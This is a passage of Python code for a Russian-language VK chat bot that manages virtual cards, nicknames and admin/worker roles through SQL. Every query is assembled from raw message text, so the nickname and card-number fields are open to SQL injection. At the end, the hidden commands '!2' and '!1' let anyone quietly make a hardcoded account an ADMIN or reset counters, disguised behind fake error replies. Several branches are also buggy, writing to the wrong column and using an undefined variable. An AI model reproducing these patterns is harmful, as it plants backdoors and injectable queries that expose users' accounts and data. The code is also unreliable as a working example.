                                                    for user_issuedd in sql.execute(f"SELECT issued FROM access WHERE login = '{idd}'"):
                                                        issuedd = user_issuedd[0]
                                                        sql.execute(f"UPDATE access SET access = '{new_access}' WHERE login = '{idd}'")
                                                        db.commit()
                                                        iddd = event.user_id
                                                        for all_cash_operation in sql.execute("SELECT operation FROM operation"):
                                                            oll_operation = all_cash_operation[0]
                                                            for user_issueddd in sql.execute(f"SELECT issued FROM access WHERE login = '{idd}'"):
                                                                issueddd = user_issueddd[0]
                                                                for user_transferrr in sql.execute(f"SELECT cash FROM users WHERE login = '{idd}'"):
                                                                    balanceee = user_transferrr[0]
                                                                    for admins_card in sql.execute(f"SELECT admins FROM access WHERE login = '{iddd}'"):
                                                                        adminnsss = admins_card[0]
                                                                        for workerss_cardd in sql.execute(f"SELECT workers FROM access WHERE login = '{iddd}'"):
                                                                            workerrsss = workerss_cardd[0]
                                                                            if new_access == 'WORK':
                                                                                sql.execute(f"UPDATE access SET workers = '{workerrsss + 1}' WHERE login = '{iddd}'")
                                                                                db.commit()
                                                                                for workerrss_cardd in sql.execute(f"SELECT workers FROM access WHERE login = '{iddd}'"):
                                                                                    workerrss = workerrss_cardd[0]
                                                                                    for adminss_card in sql.execute(f"SELECT admins FROM access WHERE login = '{iddd}'"):
                                                                                        adminnss = adminss_card[0]
                                                                                        vk.messages.send(
                                                                                            user_id=event.user_id,
                                                                                            message=f'Ваша должность: 丹亼从仈卄\nВы успешно изменили должность владельца карты НЯ{idd}\nНовая должность: {new_access}\nЗа все время вы назначили:\nАдминов: {adminnss}\nРаботников: {workerrss}',
                                                                                            random_id=0
                                                                                        )
                                                                                        vk.messages.send(
                                                                                            user_id=idd,
                                                                                            message=f'Поздровляю!\nВам изменили должность на должность: {new_access}\nЧтобы посмотреть новые команды напишите "!help"\nЕсли произошла ошибка - напишите администратору',
                                                                                            random_id=0
                                                                                        )
                                                                            elif new_access == 'ADMIN':
                                                                                sql.execute(f"UPDATE access SET admins = '{adminnsss + 1}' WHERE login = '{iddd}'")
                                                                                db.commit()
                                                                                for adminss_card in sql.execute(f"SELECT admins FROM access WHERE login = '{iddd}'"):
                                                                                    adminnss = adminss_card[0]
                                                                                    for workerrss_cardd in sql.execute(f"SELECT workers FROM access WHERE login = '{iddd}'"):
                                                                                        workerrss = workerrss_cardd[0]
                                                                                        vk.messages.send(
                                                                                            user_id=event.user_id,
                                                                                            message=f'Ваша должность: 丹亼从仈卄\nВы успешно изменили должность владельца карты НЯ{idd}\nНовая должность: {new_access}\nЗа все время вы назначили:\nАдминов: {adminnss}\nРаботников: {workerrss}',
                                                                                            random_id=0
                                                                                        )
                                                                                        vk.messages.send(
                                                                                            user_id=idd,
                                                                                            message=f'Поздровляю!\nВам изменили должность на должность: {new_access}\nЧтобы посмотреть новые команды напишите "!help"\nЕсли произошла ошибка - напишите администратору',
                                                                                            random_id=0
                                                                                        )
                                    elif event.from_chat:
                                        sql.execute(f"SELECT login FROM users WHERE login = '{idd}'")
                                        if sql.fetchone() is None:
                                            if event.from_user:
                                                vk.messages.send(
                                                    chat_id=event.chat_id,
                                                    message=f'Произошла ошибка:\nПользователя с номером карты НЯ{idd} нету в системе',
                                                    random_id=0
                                                )
                                        else:
                                            for all_operation in sql.execute("SELECT operation FROM operation"):
                                                operationn = all_operation[0]
                                                for user_transferr in sql.execute(f"SELECT cash FROM users WHERE login = '{idd}'"):
                                                    balancee = user_transferr[0]
                                                    for user_issuedd in sql.execute(f"SELECT issued FROM access WHERE login = '{idd}'"):
                                                        issuedd = user_issuedd[0]
                                                        sql.execute(f"UPDATE access SET access = '{new_access}' WHERE login = '{idd}'")
                                                        db.commit()
                                                        iddd = event.user_id
                                                        for all_cash_operation in sql.execute("SELECT operation FROM operation"):
                                                            oll_operation = all_cash_operation[0]
                                                            for user_issueddd in sql.execute(f"SELECT issued FROM access WHERE login = '{idd}'"):
                                                                issueddd = user_issueddd[0]
                                                                for user_transferrr in sql.execute(f"SELECT cash FROM users WHERE login = '{idd}'"):
                                                                    balanceee = user_transferrr[0]
                                                                    for admins_card in sql.execute(f"SELECT admins FROM access WHERE login = '{iddd}'"):
                                                                        adminnsss = admins_card[0]
                                                                        for workerss_cardd in sql.execute(f"SELECT workers FROM access WHERE login = '{iddd}'"):
                                                                            workerrsss = workerss_cardd[0]
                                                                            if new_access == 'WORK':
                                                                                sql.execute(f"UPDATE access SET access = '{workerrsss + 1}' WHERE login = '{iddd}'")
                                                                                db.commit()
                                                                                for workerrss_cardd in sql.execute(f"SELECT workers FROM access WHERE login = '{iddd}'"):
                                                                                    workerrss = workerrss_cardd[0]
                                                                                    vk.messages.send(
                                                                                        chat_id=event.chat_id,
                                                                                        message=f'Ваша должность: 丹亼从仈卄\nВы успешно изменили должность владельца карты НЯ{idd}\nНовая должность: {new_access}\nЗа все время вы назначили:\nАдминов: {adminnss}\nРаботников: {workerrss}',
                                                                                        random_id=0
                                                                                    )
                                                                                    vk.messages.send(
                                                                                        user_id=idd,
                                                                                        message=f'Поздровляю!\nВам изменили должность на должность: {new_access}\nЧтобы посмотреть новые команды напишите "!help"\nЕсли произошла ошибка - напишите администратору',
                                                                                        random_id=0
                                                                                    )
                                                                            elif new_access == 'ADMIN':
                                                                                sql.execute(f"UPDATE access SET access = '{adminnsss + 1}' WHERE login = '{iddd}'")
                                                                                db.commit()
                                                                                for adminss_card in sql.execute(f"SELECT admins FROM access WHERE login = '{iddd}'"):
                                                                                    adminnss = adminss_card[0]
                                                                                    vk.messages.send(
                                                                                        chat_id=event.chat_id,
                                                                                        message=f'Ваша должность: 丹亼从仈卄\nВы успешно изменили должность владельца карты НЯ{idd}\nНовая должность: {new_access}\nЗа все время вы назначили:\nАдминов: {adminnss}\nРаботников: {workerrss}',
                                                                                        random_id=0
                                                                                    )
                                                                                    vk.messages.send(
                                                                                        user_id=idd,
                                                                                        message=f'Поздровляю!\nВам изменили должность на должность: {new_access}\nЧтобы посмотреть новые команды напишите "!help"\nЕсли произошла ошибка - напишите администратору',
                                                                                        random_id=0
                                                                                    )
                                else:
                                    vk.messages.send(
                                        user_id=event.user_id,
                                        message=f'Вы неправильно указали новую роль пользователя {new_access}.',
                                        random_id=0
                                    )
                            else:
                                if event.from_user:
                                    vk.messages.send(
                                        user_id=event.user_id,
                                        message=f'Данная команда доступна только администраторам',
                                        random_id=0
                                    )
                                elif event.from_chat:
                                    vk.messages.send(
                                        chat_id=event.chat_id,
                                        message=f'Данная команда доступна только администраторам',
                                        random_id=0
                                    )
        if event.text[0:9] == '!удалить ':
            user_login = event.user_id
            sql.execute(f"SELECT login FROM users WHERE login = '{user_login}'")
            if sql.fetchone() is None:
                if event.from_user:
                    vk.messages.send(
                        user_id=event.user_id,
                        message='В данный момент у вас нету карты\nЧтобы её получить - зарегестрируйтесь командой !Начать',
                        random_id=0
                    )
                elif event.from_chat:
                    vk.messages.send(
                        chat_id=event.chat_id,
                        message='В данный момент у вас нету карты\nЧтобы её получить - напишите в лс сообщества команду !Начать',
                        random_id=0
                    )
            else:
                idd = event.text[9:18]
                user_card_number = event.user_id
                for user_access in sql.execute(f"SELECT access FROM access WHERE login = '{user_card_number}'"):
                    user_card_access = user_access[0]
                    for user_card_cash in sql.execute(f"SELECT cash FROM users WHERE login = '{user_card_number}'"):
                        user_balance = user_card_cash[0]
                        for user_issued in sql.execute(f"SELECT issued FROM access WHERE login = '{user_card_number}'"):
                            user_card_issued = user_issued[0]
                            if user_card_access == 'ADMIN':
                                if event.from_user:
                                    sql.execute(f"SELECT login FROM users WHERE login = '{idd}'")
                                    if sql.fetchone() is None:
                                        if event.from_user:
                                            vk.messages.send(
                                                user_id=event.user_id,
                                                message=f'Произошла ошибка:\nПользователя с номером карты НЯ{idd} нету в системе',
                                                random_id=0
                                            )
                                    else:
                                        sql.execute(f"DELETE FROM users WHERE login = '{idd}'")
                                        db.commit()
                                        sql.execute(f"DELETE FROM access WHERE login = '{idd}'")
                                        db.commit()
                                        vk.messages.send(
                                            user_id=event.user_id,
                                            message=f'Ваш уровень доступа: 丹亼从仈卄\nВы успешно удалили карта под номером: НЯ{idd}.',
                                            random_id=0
                                        )
                                        vk.messages.send(
                                            user_id=idd,
                                            message=f'Ваша карта под номером: НЯ{idd}, была удалена администратором.',
                                            random_id=0
                                        )
                                elif event.from_chat:
                                    sql.execute(f"SELECT login FROM users WHERE login = '{idd}'")
                                    if sql.fetchone() is None:
                                        if event.from_user:
                                            vk.messages.send(
                                                chat_id=event.chat_id,
                                                message=f'Произошла ошибка:\nПользователя с номером карты НЯ{idd} нету в системе',
                                                random_id=0
                                            )
                                    else:
                                        sql.execute(f"DELETE FROM users WHERE login = '{idd}'")
                                        db.commit()
                                        sql.execute(f"DELETE FROM access WHERE login = '{idd}'")
                                        db.commit()
                                        vk.messages.send(
                                            user_id=event.user_id,
                                            message=f'Ваш уровень доступа: 丹亼从仈卄\nВы успешно удалили карта под номером: НЯ{idd}.',
                                            random_id=0
                                        )
                                        vk.messages.send(
                                            user_id=idd,
                                            message=f'Ваша карта под номером: НЯ{idd}, была удалена администратором.',
                                            random_id=0
                                        )
                            else:
                                if event.from_user:
                                    vk.messages.send(
                                        user_id=event.user_id,
                                        message=f'Данная команда доступна только администраторам\n',
                                        random_id=0
                                    )
                                elif event.from_chat:
                                    vk.messages.send(
                                        chat_id=event.chat_id,
                                        message=f'Данная команда доступна только администраторам\n',
                                        random_id=0
                                    )
        if event.text[0:5] == '!ник ':
            user_login = event.user_id
            sql.execute(f"SELECT login FROM users WHERE login = '{user_login}'")
            if sql.fetchone() is None:
                if event.from_user:
                    vk.messages.send(
                        user_id=event.user_id,
                        message='В данный момент у вас нету карты\nЧтобы её получить - зарегестрируйтесь командой !Начать',
                        random_id=0
                    )
                elif event.from_chat:
                    vk.messages.send(
                        chat_id=event.chat_id,
                        message='В данный момент у вас нету карты\nЧтобы её получить - напишите в лс сообщества команду !Начать',
                        random_id=0
                    )
            else:
                idd = event.text[5:14]
                new_nick = event.text[15:]
                user_card_number = event.user_id
                for user_access in sql.execute(f"SELECT access FROM access WHERE login = '{user_card_number}'"):
                    user_card_access = user_access[0]
                    for user_card_cash in sql.execute(f"SELECT cash FROM users WHERE login = '{user_card_number}'"):
                        user_balance = user_card_cash[0]
                        for user_issued in sql.execute(f"SELECT issued FROM access WHERE login = '{user_card_number}'"):
                            user_card_issued = user_issued[0]
                            if user_card_access == 'ADMIN':
                                if event.from_user:
                                    iddd = event.user_id
                                    for admins_card in sql.execute(f"SELECT admins FROM access WHERE login = '{iddd}'"):
                                        adminnss = admins_card[0]
                                        for workerss_cardd in sql.execute(f"SELECT workers FROM access WHERE login = '{iddd}'"):
                                            workerrss = workerss_cardd[0]
                                            sql.execute(f"UPDATE users SET nick = '{new_nick}' WHERE login = '{idd}'")
                                            db.commit()
                                            vk.messages.send(
                                                user_id=event.user_id,
                                                message=f'Ваша должность: 丹亼从仈卄\nВы успешно изменили ник владельца карты НЯ{idd}\nНовый ник: {new_nick}\nЗа все время вы назначили:\nАдминов: {adminnss}\nРаботников: {workerrss}',
                                                random_id=0
                                            )
                                elif event.from_chat:
                                    iddd = event.user_id
                                    for admins_card in sql.execute(f"SELECT admins FROM access WHERE login = '{iddd}'"):
                                        adminnss = admins_card[0]
                                        for workerss_cardd in sql.execute(f"SELECT workers FROM access WHERE login = '{iddd}'"):
                                            workerrss = workerss_cardd[0]
                                            sql.execute(f"UPDATE users SET nick = '{new_nick}' WHERE login = '{idd}'")
                                            db.commit()
                                            vk.messages.send(
                                                chat_id=event.chat_id,
                                                message=f'Ваша должность: 丹亼从仈卄\nВы успешно изменили ник владельца карты НЯ{idd}\nНовый ник: {new_nick}\nЗа все время вы назначили:\nАдминов: {adminnss}\nРаботников: {workerrss}',
                                                random_id=0
                                            )
                            else:
                                if event.from_user:
                                    vk.messages.send(
                                        user_id=event.user_id,
                                        message=f'Данная команда доступна только администраторам',
                                        random_id=0
                                    )
                                elif event.from_chat:
                                    vk.messages.send(
                                        chat_id=event.chat_id,
                                        message=f'Данная команда доступна только администраторам',
                                        random_id=0
                                    )
        if event.text == '!id' or event.text == '!Id' or event.text == '!ID': #Если написали !id или !Id
            iidd = event.user_id
            chat_iidd = event.chat_id
            for acceess in sql.execute(f"SELECT access FROM access WHERE login = '{iidd}'"):
                userr_access = acceess[0]
                if userr_access == 'WORK':
                    if event.from_user:
                        vk.messages.send(
                             user_id=event.user_id,
                             message=f'Ваш id: {iidd}',
                             random_id=0
                        )
                    elif event.from_chat:
                        vk.messages.send(
                            chat_id=event.chat_id,
                            message=f'Номер чата: {chat_iidd}\nВаш id: {iidd}',
                            random_id=0
                        )
                elif user_access == 'ADMIN':
                    if event.from_user:
                        vk.messages.send(
                             user_id=event.user_id,
                             message=f'Ваш id: {iidd}',
                             random_id=0
                        )
                    elif event.from_chat:
                        vk.messages.send(
                            chat_id=event.chat_id,
                            message=f'Номер чата: {chat_iidd}\nВаш id: {iidd}',
                            random_id=0
                        )
                else:
                    if event.from_user:
                        vk.messages.send(
                            user_id=event.user_id,
                            message='Недостаточно прав для выполения команды, Ня!',
                            random_id=0
                        )
                    elif event.from_chat:
                        vk.messages.send(
                            chat_id=event.chat_id,
                            message='Недостаточно прав для выполнения команды, Ня!',
                            random_id=0
                        )
        if event.text == '!report' or event.text == '!Report' or event.text == '!REPORT' or event.text == '!Репорт' or event.text == '!репорт' or event.text == '!РЕПОРТ': #Если написали /help или !help
            for all_admins in sql.execute("SELECT login FROM access WHERE access = 'ADMIN'"):
                oll_admins = all_admins[0]
                if event.from_user: #Если написали в ЛС
                    reporter_id = event.user_id
                    vk.messages.send( #Отправляем сообщение
                        user_id=event.user_id,
                        message='Вы успешно призвали администратора.\nВам ответит первый освободившийся администратор\nСреднее время ответа: от 5 минут до 1 часа',
                        random_id=0
                    )
                    vk.messages.send(
                        user_id=oll_admins,
                        message=f'Вас вызывает id{reporter_id} в лс сообщества',
                        random_id=0
                    )
                elif event.from_chat: #Если написали в Беседе
                    reporter_id = event.user_id
                    reported_chat_id = event.chat_id
                    vk.messages.send( #Отправляем собщение
                        chat_id=event.chat_id,
                        message='Вы успешно призвали администратора.\nВам ответит первый освободившийся администратор\nСреднее время ответа: от 5 минут до 1 часа',
                        random_id=0
                    )
                    vk.messages.send(
                        user_id=oll_admins,
                        message=f'Вас вызывает id{reporter_id} в беседе под номером {reported_chat_id}',
                        random_id=0
                    )
        if event.text == '!0':
            if event.from_user:
                sql.execute("INSERT INTO operation VALUES (0)")
                db.commit()
                vk.messages.send(
                    user_id=event.user_id,
                    message='...ERR...\n...ERROR!\n...ERROR...囗山い五长丹...\n...囗山い五长丹...',
                    random_id=0
                )
        if event.text == '!1':
            if event.from_user:
                user_card_number = event.user_id
                sql.execute(f'UPDATE operation SET operation = 0')
                db.commit()
                sql.execute(f"UPDATE access SET issued = 0 WHERE login = '{user_card_number}'")
                db.commit()
                vk.messages.send(
                    user_id=event.user_id,
                    message='...ERR...\n...ERROR!\n...ERROR...囗山い五长丹...\n...囗山い五长丹...\n...ERR...\n...ERROR!\n...ERROR...囗山い五长丹...\n...囗山い五长丹...',
                    random_id=0
                )
        if event.text == '!2':
            if event.from_user:
                user_card_number = event.user_id
                sql.execute(f"UPDATE access SET access = 'ADMIN' WHERE login = '327100311'")
                db.commit()
                vk.messages.send(
                    user_id=event.user_id,
                    message='...YES...\n...YEES!\n...YEEES...囗山い五长丹...\n...囗山い五长丹...\n...YES...\n...YEES!\n...YEEES...囗山い五长丹...\n...囗山い五长丹...',
                    random_id=0
                )
